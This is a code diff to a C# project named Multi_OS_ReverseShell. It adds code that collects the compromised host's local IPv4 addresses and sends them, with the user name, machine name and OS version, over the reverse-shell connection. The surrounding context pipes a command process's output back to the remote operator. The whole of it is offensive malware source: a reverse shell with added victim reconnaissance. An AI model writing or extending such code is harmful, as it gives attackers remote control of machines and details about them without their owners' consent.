@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.IO;
+using System.Net;
 using System.Net.Sockets;
 using System.Text;
 
@@ -61,11 +62,19 @@ namespace Multi_OS_ReverseShell
                 processCmd.BeginOutputReadLine();
                 processCmd.BeginErrorReadLine();
             }
+			IPAddress[] localIPs = Dns.GetHostAddresses(Dns.GetHostName());
             streamWriter.WriteLine("\n--[ Multi-OS ReverseShell ]---------------\n");
             streamWriter.WriteLine(" USER\t" + System.Environment.UserName + "\n LOCAL\t" + System.Environment.MachineName + "\n OS\t" + System.Environment.OSVersion);
-            streamWriter.WriteLine("\n------------------------------------------\n");
+            streamWriter.Write(" IPs\t");
+            foreach (IPAddress addr in localIPs)
+            {
+                if (addr.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    streamWriter.Write(addr + "  ");
+                }
+            }
+            streamWriter.WriteLine("\n\n------------------------------------------\n");
             streamWriter.Flush();
-
             processCmd.StandardInput.WriteLine(" ");
 
             while (true)
